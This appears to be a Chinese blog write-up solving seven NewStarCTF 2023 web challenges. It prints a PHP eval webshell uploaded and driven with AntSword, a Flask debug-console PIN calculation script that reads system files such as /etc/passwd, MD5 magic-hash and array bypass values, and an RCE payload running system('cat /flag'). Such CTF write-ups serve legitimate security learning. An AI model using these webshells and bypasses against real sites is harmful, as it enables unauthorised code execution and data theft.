<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>BUUCTF NewStarCTF 2023 WEB题WP - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="BUUCTF NewStarCTF 2023 WEB题WP" />
<meta property="og:description" content="一.泄露的秘密 直接在URL处访问www.zip文件
将下载下来的www.zip文件解压即可得到flag
常见的文件泄露一般泄露的都是网站的备份文件，常见的备份的文件名通常为 wwwroot、www、子域名等，压缩包后缀通常为 zip、tar.gz 等
其他的也有配置文件的泄露。建议自己收集一个敏感文件的字典
二.Begin of Upload 很简单的文件上传
查看网页源码可以发现限制上传的js代码，是最没用的前端过滤
这里只需要F12，再F1，选择禁用js代码即可
接下来构造一个一句话木马
&lt;?php @eval($_POST[&#39;a&#39;]); ?&gt; 这里写用GET方式的马应该也可以，我没有试，感觉用webshell管理工具找flag更快
直接上传即可
打开自己的webshell管理工具，这里我用的蚁剑
URL地址是 IP/upload/demo.php
连接密码就是POST中的参数
点击测试连接，出现连接成功就代表成功了
选择保存，右键刚刚添加的数据
flag藏在根目录下
三.Begin of HTTP 提示我们使用GET方式传参
http://ip/?ctf=1
又让用POST传参
先找一下secret的值
查看源代码，再代码中藏着secret的值
再进行base64解码
n3wst4rCTF2023g00000d
接着我们使用burp抓包
将抓到的包改为POST请求方式
这里要注意第一小关get请求的参数也要带着
接下来把cookie的power值改为ctfer即可
吧UA头改为NewStarCTF2023即可，注意不用带着浏览器三个字
这里需要添加一个Referer头，填入对应网址即可
本地用户这里我卡了很久，最后是用的X-Real-IP这个头，确实没想到
四.ErrorFlask 一看到Flask我就想到了之前做过的一个模板注入题和debug调试漏洞
来到题目，让我们穿一个number1和number2.那我们先传一个number1看看会咋样
很熟悉的报错界面，看到这里我当时基本确定了是需要计算pin，通过python的shell交互找flag，顺着这个思路让我吃了大亏啊
先来揭秘flag在哪，万万没想到啊，flag就在这个报错界面啊
展开 File &#34;/app/app.py&#34;, line 11, in hello 即可看到flag
说到这里了，我简单介绍一下flask debug漏洞
在这个报错界面，我们把鼠标随便放到一行上，可以看的这个小黑框
点一下就提示我们输入pin
pin码的计算通常需要五个部分
首先是app的绝对路径，在报错界面即可找到
然后是uuidnode 通常在如下路径下
/sys/class/net/eth0/address
然后需要拿到ID 通常在如下这两个里面
/proc/sys/kernel/random/boot_id file" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/76b1fe2844e699ba9f135f9953254c00/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-10-07T10:52:50+08:00" />
<meta property="article:modified_time" content="2023-10-07T10:52:50+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">BUUCTF NewStarCTF 2023 WEB题WP</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2>一.泄露的秘密</h2> 
<p>直接在URL处访问www.zip文件</p> 
<p>将下载下来的www.zip文件解压即可得到flag</p> 
<p><img alt="" height="549" src="https://images2.imgbox.com/76/c1/XaJx3GNB_o.png" width="1200"></p> 
<p>常见的文件泄露一般泄露的都是网站的备份文件，常见的备份的文件名通常为 wwwroot、www、子域名等，压缩包后缀通常为 zip、tar.gz 等</p> 
<p>其他的也有配置文件的泄露。建议自己收集一个敏感文件的字典</p> 
<h2>二.Begin of Upload</h2> 
<p>很简单的文件上传</p> 
<p>查看网页源码可以发现限制上传的js代码，是最没用的前端过滤</p> 
<p>这里只需要F12，再F1，选择禁用js代码即可</p> 
<p><img alt="" height="1110" src="https://images2.imgbox.com/ee/34/ZuP90nw1_o.png" width="884"></p> 
<p>接下来构造一个一句话木马</p> 
<pre><code class="language-php">&lt;?php @eval($_POST['a']); ?&gt;</code></pre> 
<p>这里写用GET方式的马应该也可以，我没有试，感觉用webshell管理工具找flag更快</p> 
<p>直接上传即可</p> 
<p><img alt="" height="438" src="https://images2.imgbox.com/53/b3/piapcTwz_o.png" width="1109"></p> 
<p>打开自己的webshell管理工具，这里我用的蚁剑</p> 
<p>URL地址是  IP/upload/demo.php</p> 
<p>连接密码就是POST中的参数</p> 
<p><img alt="" height="670" src="https://images2.imgbox.com/78/d7/c0iH0nWt_o.png" width="830"></p> 
<p>点击测试连接，出现连接成功就代表成功了</p> 
<p><img alt="" height="801" src="https://images2.imgbox.com/8a/33/JI3m1K1j_o.png" width="1166"></p> 
<p>选择保存，右键刚刚添加的数据</p> 
<p><img alt="" height="956" src="https://images2.imgbox.com/55/80/NGJDCgsR_o.png" width="1200"></p> 
<p>flag藏在根目录下</p> 
<p><img alt="" height="962" src="https://images2.imgbox.com/8f/31/ILuOjT1j_o.png" width="1200"></p> 
<p><img alt="" height="328" src="https://images2.imgbox.com/2d/bc/ayRkFVwG_o.png" width="871"></p> 
<h2>三.Begin of HTTP</h2> 
<p>提示我们使用GET方式传参</p> 
<blockquote> 
 <p><a href="http://node4.buuoj.cn:28025/?ctf=1" rel="nofollow" title="http://ip/?ctf=1">http://ip/?ctf=1</a></p> 
</blockquote> 
<p> <img alt="" height="842" src="https://images2.imgbox.com/20/04/QXzRdRP8_o.png" width="1200"></p> 
<p>又让用POST传参</p> 
<p>先找一下secret的值</p> 
<p>查看源代码，再代码中藏着secret的值</p> 
<p><img alt="" height="1200" src="https://images2.imgbox.com/5f/78/Q97hwaS4_o.png" width="1200"></p> 
<p>再进行base64解码</p> 
<p><img alt="" height="783" src="https://images2.imgbox.com/c2/27/yQZqh6sM_o.png" width="1200"></p> 
<blockquote> 
 <p>n3wst4rCTF2023g00000d</p> 
</blockquote> 
<p>接着我们使用burp抓包</p> 
<p>将抓到的包改为POST请求方式</p> 
<p><img alt="" height="1200" src="https://images2.imgbox.com/8f/d6/jtwEC37Z_o.png" width="1200"> 这里要注意第一小关get请求的参数也要带着<img alt="" height="1131" src="https://images2.imgbox.com/84/aa/mNPW9DsY_o.png" width="1200"></p> 
<p> 接下来把cookie的power值改为ctfer即可</p> 
<p><img alt="" height="1200" src="https://images2.imgbox.com/45/f5/KPqjdtw3_o.png" width="1200"></p> 
<p> 吧UA头改为NewStarCTF2023即可，注意不用带着浏览器三个字</p> 
<p><img alt="" height="1200" src="https://images2.imgbox.com/16/76/8zqj2t0J_o.png" width="1200"></p> 
<p>这里需要添加一个Referer头，填入对应网址即可</p> 
<p><img alt="" height="1200" src="https://images2.imgbox.com/89/af/eqe2Bv1P_o.png" width="1200"> 本地用户这里我卡了很久，最后是用的X-Real-IP这个头，确实没想到</p> 
<p><img alt="" height="1200" src="https://images2.imgbox.com/56/35/PmTuRS3i_o.png" width="1200"></p> 
<h2> 四.ErrorFlask</h2> 
<p>一看到Flask我就想到了之前做过的一个模板注入题和debug调试漏洞</p> 
<p>来到题目，让我们穿一个number1和number2.那我们先传一个number1看看会咋样</p> 
<p><img alt="" height="1200" src="https://images2.imgbox.com/7f/da/an9mg8DW_o.png" width="1200"></p> 
<p> 很熟悉的报错界面，看到这里我当时基本确定了是需要计算pin，通过python的shell交互找flag，顺着这个思路让我吃了大亏啊</p> 
<p>先来揭秘flag在哪，万万没想到啊，flag就在这个报错界面啊</p> 
<p>展开 File "/app/app.py", line <em>11</em>, in <code>hello 即可看到flag</code></p> 
<p><img alt="" height="1200" src="https://images2.imgbox.com/a2/d3/ll06WXMb_o.png" width="1200"></p> 
<p>说到这里了，我简单介绍一下flask debug漏洞</p> 
<p>在这个报错界面，我们把鼠标随便放到一行上，可以看的这个小黑框</p> 
<p><img alt="" height="1200" src="https://images2.imgbox.com/cd/47/rf5a0lQY_o.png" width="1200"></p> 
<p>点一下就提示我们输入pin</p> 
<p><img alt="" height="528" src="https://images2.imgbox.com/f9/dd/LCzTCNPt_o.png" width="1142"></p> 
<p> pin码的计算通常需要五个部分</p> 
<p>首先是app的绝对路径，在报错界面即可找到</p> 
<p>然后是uuidnode 通常在如下路径下</p> 
<blockquote> 
 <p>/sys/class/net/eth0/address</p> 
</blockquote> 
<p>然后需要拿到ID 通常在如下这两个里面</p> 
<blockquote> 
 <p>/proc/sys/kernel/random/boot_id file</p> 
 <p>/proc/self/cgroup</p> 
</blockquote> 
<p>最后需要username，一般在如下路径中</p> 
<blockquote> 
 <p>/etc/passwd </p> 
</blockquote> 
<p>最后放到脚本中即可计算出pin码</p> 
<p>这里附上大佬写的脚本</p> 
<pre><code class="language-python">#sha1
import hashlib
from itertools import chain
probably_public_bits = [
    'root'# /etc/passwd
    'flask.app',# 默认值
    'Flask',# 默认值
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # 报错得到
]

private_bits = [
    '2485377581187',#  /sys/class/net/eth0/address 16进制转10进制
    #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup
    '653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'#  /proc/self/cgroup
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)

</code></pre> 
<p>最后将计算出的pin码输入即可获得一个python的shell交互界面，通常这个漏洞需要配合任意文件读取漏洞的</p> 
<h2 style="background-color:transparent;">五.Begin of PHP</h2> 
<p>又是小闯关</p> 
<p>先简单介绍下五小关的大体意思</p> 
<blockquote> 
 <ol><li> <p><strong>Level 1</strong>：要求用户提供两个参数 key1 和 key2，并检查它们是否不同且它们的MD5哈希值相等。</p> </li><li> <p><strong>Level 2</strong>：用户需要通过POST请求提供 key3，并检查它的MD5哈希值是否与SHA-1哈希值相等。</p> </li><li> <p><strong>Level 3</strong>：用户需要提供 key4 参数，然后检查它是否与文件 "/flag" 中的内容相等。</p> </li><li> <p><strong>Level 4</strong>：用户需要提供 key5 参数，然后检查它是否不是数字且大于 2023。</p> </li><li> <p><strong>Level 5</strong>：在这一级别，用户需要提供一些POST参数，并检查这些参数是否都不包含字母和数字。如果通过此检查，用户将能够查看 "/flag" 文件的内容。</p> </li></ol> 
</blockquote> 
<p>如果两个字符经<a href="https://so.csdn.net/so/search?q=MD5&amp;spm=1001.2101.3001.7020" title="MD5">MD5</a>加密后为 0exxxxx的形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，结果都是零，所以是相等的。</p> 
<p>这里提供几个MD5后为0e的值</p> 
<blockquote> 
 <p>QNKCDZO</p> 
 <p>240610708</p> 
 <p>s878926199a</p> 
 <p>s155964671a</p> 
 <p>s214587387a</p> 
 <p>s214587387a</p> 
</blockquote> 
<p> 顺利来到第二小关</p> 
<p><img alt="" height="838" src="https://images2.imgbox.com/6b/7a/571gWOPL_o.png" width="790"> 第二小关我们利用数组进行绕过</p> 
<p>Md5和sha1对一个数组进行加密将返回NULL；而NULL===NULL返回true，所以可绕过判断。</p> 
<p><img alt="" height="1200" src="https://images2.imgbox.com/93/f9/CWOWepHN_o.png" width="1200"></p> 
<p>来到第三关</p> 
<p>strcmp是比较两个字符串，如果str1&lt;str2 则返回&lt;0 ，如果str1大于str2则返回&gt;0 ，如果两者相等则返回0。</p> 
<p>strcmp会判断字符串类型，如果强行传入其他类型参数，会出错，出错后返回值0，正是利用这点进行绕过。</p> 
<p>这里我们同样传入数组进行绕过</p> 
<p><img alt="" height="1200" src="https://images2.imgbox.com/f9/27/VMjr7Gkd_o.png" width="1119"></p> 
<p>来到第四小关，要求传入的字符串不能是数字且大于2023</p> 
<p>PHP的对字符串的转换规则是：若字符串以数字开头，则最终的转化结果为开头的数字，否则为0</p> 
<p>所以这里我们传入2024a即可</p> 
<p><img alt="" height="1200" src="https://images2.imgbox.com/3b/08/J1Z0nEVs_o.png" width="1200"></p> 
<p>来到最后一小关</p> 
<p>也是通过数组绕过的。</p> 
<p><img alt="" height="1200" src="https://images2.imgbox.com/e3/fa/b20n0uOR_o.png" width="1159"></p> 
<h2>六.R!C!E!</h2> 
<p>又是一段php代码</p> 
<p><img alt="" height="250" src="https://images2.imgbox.com/58/18/4s2XJWkm_o.png" width="805"></p> 
<p>还是简单解释一下</p> 
<blockquote> 
 <p>首先检查POST方式传入的pssword和e_v.a.l的值是否为空，然后将pssword进行md5加密并传给变量password，e_v.a.l传给变量code，如果变量password的前六位为c4d038，也就是我们传入的password进行md5加密后的前六位为c4d038，再判断变量code中不包含那些过滤的字符，就是执行变量code的命令</p> 
</blockquote> 
<p>这里有个大坑，e_v.a.l的命令不规范，三个点会被解析成<strong>_ ，</strong>这里就需要利用到php的一个特性了，大概是在<strong>php8.0</strong>版本以前的，<strong>"["</strong>会被解析成<strong>“_”</strong>，并且在<strong>“[”</strong>之后不规范的字符都不会再被转化，所以这里我们可以利用<strong>“[”</strong>进行绕过</p> 
<p>后面命令执行的绕过方法有很多，随便用个自己喜欢的就行</p> 
<pre><code>password=114514&amp;e[v.a.l=eval($_POST[1]);&amp;1=system('cat /flag');</code></pre> 
<p><img alt="" height="890" src="https://images2.imgbox.com/67/f4/VfXCWrqI_o.png" width="1200"></p> 
<h2>七.EasyLogin</h2> 
<p>先随便注册一个用户，登陆进去</p> 
<p>登录进去发现一个奇奇怪怪的交互模式</p> 
<p>这里尝试 <strong>ctrl+c </strong>或者 <strong>ctrl+d </strong>能不能结束会话</p> 
<p><img alt="" height="614" src="https://images2.imgbox.com/36/8b/CbOosiLC_o.png" width="1200"></p> 
<p>ctrl+d结束会话之后，我找了一圈目录，只有一个bin目录，一般在bin下存放的都是可执行的命令</p> 
<p>好像都没啥用，这里我突发奇想，一直摁↑能不能找到之前执行的命令呢</p> 
<p>这里发现了敏感的命令了</p> 
<p><img alt="" height="884" src="https://images2.imgbox.com/1c/3b/f1fiLrep_o.png" width="1200"></p> 
<p>这三条命令简单来说</p> 
<blockquote> 
 <p>将两个密码字符串写入文件 <code>weak-passwd.txt</code>，然后从中随机选择一个密码，并将其存储在 <code>PASSWORD</code> 环境变量中，最后删除 <code>weak-passwd.txt</code> 文件</p> 
</blockquote> 
<p> 看来admin的密码应该就是这其中两个了</p> 
<p><img alt="" height="732" src="https://images2.imgbox.com/1a/aa/gMbexHDX_o.png" width="972"></p> 
<p>这里两个密码都不对，我要骂人了！！！！！！！</p> 
<p>最后跑字典，弱口令000000登录成功了</p> 
<p><img alt="" height="534" src="https://images2.imgbox.com/a5/32/JVYOWjHY_o.png" width="1200"></p> 
<p>提示用burp</p> 
<p>最后在burp中发现一个302重定向请求，flag就在这里</p> 
<p><img alt="" height="1064" src="https://images2.imgbox.com/d0/5a/RDkDZTeJ_o.png" width="1200"></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/7ad5b3eb5e684afb0ce422753f4e4f5b/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">JavaScript 中testContent的用法</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/5ca3a646a550e085e5216ae6da118bf5/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">微信小程序 -- 页面间通信</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>